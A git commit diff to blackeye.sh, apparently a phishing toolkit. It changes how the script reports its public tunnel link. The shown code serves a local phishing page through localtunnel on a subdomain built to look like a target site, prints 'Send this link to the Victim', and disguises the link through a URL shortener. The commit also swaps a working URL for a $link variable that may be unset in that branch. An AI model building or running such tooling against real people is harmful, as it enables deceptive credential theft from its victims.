dd93e73eb8406160f693421f1f1461c713e9a440
THE-MERCHANT1 <karimdiaa088@gmail.com>
2026-08-27 19:05:05 +0300

    testing feature

--- blackeye.sh
+++ blackeye.sh
@@ -493,7 +493,6 @@ start_ngrok() {
         printf "\e[1;91m[!]\e[0m ngrok API responded, but no public URL was returned.\n"
 
         printf "\e[1;91m[!]\e[0m ngrok API response:\n"
-        printf "\e[1;91m[!]\e[0m "$link""
         cat "$tunnels_file"
 
         kill "$php_pid" 2>/dev/null
@@ -538,7 +537,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel server...\n"
 sleep 8
 lt --port 5555 --subdomain wmw-$server-com &
 sleep 4
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "https://wmw-"$server"-com.loca.lt"
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 short_link=`wget -q -O - http://tinyurl.com/api-create.php?url=https://wmw-$server-com.loca.lt`
 printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
 echo ""
